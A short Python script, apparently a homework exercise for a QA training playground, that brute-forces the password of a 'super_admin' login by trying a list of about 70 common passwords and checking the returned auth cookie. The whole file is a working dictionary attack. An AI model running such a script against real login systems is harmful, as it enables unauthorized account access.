import requests

common_passwords = {"password",	"123456",	"12345678",	"qwerty",	"abc123",
                    "monkey",	"1234567",	"letmein",	"trustno1",	"dragon",
                    "baseball",	"111111",	"iloveyou",	"master",	"sunshine",
                    "ashley",	"bailey",	"passw0rd",	"shadow",	"123123",
                    "654321",	"superman",	"qazwsx",	"michael",	"Football",
                    "welcome",	"jesus",	"ninja",	"mustang",	"password1",
                    "123456789",	"adobe123[a]",	"admin",	"1234567890",
                    "photoshop[a]",	"1234",	"12345",	"princess",	"azerty",
                    "000000",	"access",	"696969",	"batman",	"1qaz2wsx",
                    "login",	"qwertyuiop",	"solo",	"starwars",	"121212",
                    "flower",	"hottie",	"loveme",	"zaq1zaq1",	"hello",
                    "freedom",	"whatever",	"666666",	"!@#$%^&*",	"charlie",
                    "aa123456",	"donald",	"qwerty123",	"1q2w3e4r",	"555555",
                    "lovely",	"7777777",	"888888",	"123qwe"}

for key in common_passwords:
    response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data={"login": "super_admin", "password": key})
    cookie_value1 = response1.cookies.get('auth_cookie')
    cookies = {"auth_cookie": cookie_value1}
    response2 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
    if response2.text != "You are NOT authorized":
        print(response2.text)
        print(f"Пароль: {key}")
        break

